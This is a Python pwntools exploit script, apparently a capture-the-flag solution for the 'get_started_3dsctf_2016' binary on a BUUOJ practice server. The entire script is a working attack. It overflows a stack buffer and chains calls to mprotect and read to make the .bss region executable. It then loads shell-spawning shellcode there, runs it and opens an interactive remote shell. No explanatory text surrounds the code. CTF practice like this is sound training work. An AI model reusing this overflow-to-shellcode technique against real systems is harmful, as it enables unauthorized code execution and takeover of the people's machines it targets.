from pwn import *

elf = ELF('get_started_3dsctf_2016')
#p = process('./get_started_3dsctf_2016')
p = remote('node3.buuoj.cn', 26627)

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
pop_3_ret_addr = 0x0806fc08
bss_addr = 0x080ec000
shell_len = 0x2000
bss_rights = 4 + 2 + 1 #run write read

shellcode = asm(shellcraft.sh(), os='linux', arch='i386')

payload = b'a' * ( 0x38 ) + p32(mprotect_addr) + p32(pop_3_ret_addr) + p32(bss_addr) + p32(shell_len) + p32(bss_rights) + p32(read_addr) + p32(pop_3_ret_addr) + p32(0) + p32(bss_addr) + p32(0x100) + p32(bss_addr)
	
p.sendline(payload)
p.sendline(shellcode)

p.interactive()
